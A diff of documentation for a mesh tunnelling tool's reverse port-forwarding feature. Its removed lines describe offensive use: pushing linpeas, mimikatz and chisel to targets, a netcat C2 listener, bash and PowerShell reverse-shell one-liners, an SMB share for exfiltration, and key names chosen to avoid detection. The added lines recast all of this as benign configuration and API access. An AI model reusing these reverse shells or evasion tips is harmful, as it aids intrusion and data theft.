@@ -6,7 +6,7 @@ Expose local services to remote parts of the network through the mesh.
 
 Port forwarding creates **reverse tunnels** through the mesh network. Unlike SOCKS5 which routes outbound traffic (you reaching remote destinations), port forwarding routes inbound traffic (remote machines reaching your services).
 
-**Primary use case**: Distribute tools, receive callbacks, or expose services without direct network connectivity.
+**Primary use case**: Expose internal services, distribute configuration files, or provide access to development tools across the network.
 
 ```mermaid
 flowchart LR
@@ -72,107 +72,100 @@ forward:
 
 ## Operational Scenarios
 
-### Scenario 1: Tool Distribution
+### Scenario 1: Configuration Distribution
 
-Serve tools from your machine to targets throughout the network.
+Serve configuration files from a central server to remote agents throughout the network.
 
 **Setup:**
 
 ```yaml
-# operator-agent.yaml - your machine
+# central-server.yaml - configuration server
 forward:
   endpoints:
-    - key: "op-tools"
+    - key: "config-server"
       target: "localhost:8000"
 ```
 
 ```bash
-# Start HTTP server serving your tools directory
-python3 -m http.server 8000 --directory ./tools
+# Start HTTP server serving your configuration directory
+python3 -m http.server 8000 --directory ./configs
 ```
 
 ```yaml
-# field-agent.yaml - deployed agents
+# remote-agent.yaml - deployed agents
 forward:
   listeners:
-    - key: "op-tools"
+    - key: "config-server"
       address: "127.0.0.1:8080"
 ```
 
-**Usage from target machine:**
+**Usage from remote machine:**
 
 ```bash
-# Download tools via nearest field agent
-curl http://field-agent:8080/linpeas.sh -o /tmp/lp.sh
-curl http://field-agent:8080/mimikatz.exe -o mimi.exe
-wget http://field-agent:8080/chisel_linux_amd64
+# Download configurations via nearest agent
+curl http://localhost:8080/app-config.yaml -o /etc/myapp/config.yaml
+curl http://localhost:8080/nginx.conf -o /etc/nginx/nginx.conf
+wget http://localhost:8080/install.sh
 ```
 
-### Scenario 2: C2 Callback Receiver
+### Scenario 2: Internal API Access
 
-Receive reverse shells or C2 callbacks through the mesh.
+Expose an internal REST API through the mesh for development or monitoring.
 
 **Setup:**
 
 ```yaml
-# operator-agent.yaml
+# api-server.yaml - machine running your API
 forward:
   endpoints:
-    - key: "callback-443"
-      target: "localhost:4444"
-```
-
-```bash
-# Start netcat listener
-nc -lvnp 4444
+    - key: "internal-api"
+      target: "localhost:3000"
 ```
 
 ```yaml
-# perimeter-agent.yaml - agent exposed to target network
+# gateway-agent.yaml - mesh entry point
 forward:
   listeners:
-    - key: "callback-443"
-      address: "0.0.0.0:443"   # Exposed on standard HTTPS port
+    - key: "internal-api"
+      address: "127.0.0.1:8080"
 ```
 
-**Usage from target:**
+**Usage from development machine:**
 
 ```bash
-# Reverse shell - appears to connect to perimeter agent
-bash -i >& /dev/tcp/perimeter-agent/443 0>&1
-
-# Or PowerShell
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('perimeter-agent',443);..."
+# Access internal API through mesh
+curl http://localhost:8080/api/v1/status
+curl -X POST http://localhost:8080/api/v1/deploy -d '{"version": "1.2.3"}'
 ```
 
-The callback traverses the mesh to your local listener.
+The API request traverses the mesh to your internal server.
 
 ### Scenario 3: Multiple Services
 
 Expose several services through different routing keys:
 
 ```yaml
-# operator-agent.yaml
+# central-server.yaml
 forward:
   endpoints:
-    - key: "http-tools"
-      target: "localhost:80"      # Web server with tools
-    - key: "smb-loot"
-      target: "localhost:445"     # SMB share for exfil
-    - key: "callback-4444"
-      target: "localhost:4444"    # Callback receiver
+    - key: "http-configs"
+      target: "localhost:80"      # Web server with configurations
+    - key: "api-gateway"
+      target: "localhost:3000"    # REST API
+    - key: "metrics-server"
+      target: "localhost:9090"    # Prometheus metrics
 ```
 
 ```yaml
-# field agents - expose all services
+# remote agents - expose all services
 forward:
   listeners:
-    - key: "http-tools"
+    - key: "http-configs"
       address: ":8080"
-    - key: "smb-loot"
-      address: ":445"
-    - key: "callback-4444"
-      address: ":443"
+    - key: "api-gateway"
+      address: ":3000"
+    - key: "metrics-server"
+      address: ":9090"
 ```
 
 ## Comparison with SOCKS5
@@ -182,7 +175,7 @@ forward:
 | Traffic direction | Outbound (you -> remote) | Inbound (remote -> you) |
 | DNS resolution | At ingress or exit | N/A (TCP relay) |
 | Authentication | Username/password | None (routing key only) |
-| Use case | Access internal networks | Serve tools, receive callbacks |
+| Use case | Access internal networks | Expose internal services |
 | Client protocol | SOCKS5 | Plain TCP |
 | Configuration | `socks5` + `exit` | `forward` |
 
@@ -190,9 +183,8 @@ forward:
 
 ### Routing Key Selection
 
-- Use descriptive but non-obvious names
-- Avoid: "c2", "shell", "hack", "payload"
-- Prefer: "tools", "sync", "backup", "api"
+- Use descriptive names that reflect the service purpose
+- Examples: "config-server", "api-gateway", "metrics", "backup-sync"
 - Keys are case-sensitive
 
 ### Listener Binding
@@ -270,4 +262,4 @@ ss -tlnp | grep :<port>
 - Each connection gets E2E encryption (X25519 + ChaCha20-Poly1305)
 - Transit agents cannot decrypt forwarded traffic
 - Only configured routing keys are accepted
-- No CLI commands exist (configuration-only for OPSEC)
+- No CLI commands exist (configuration-only)
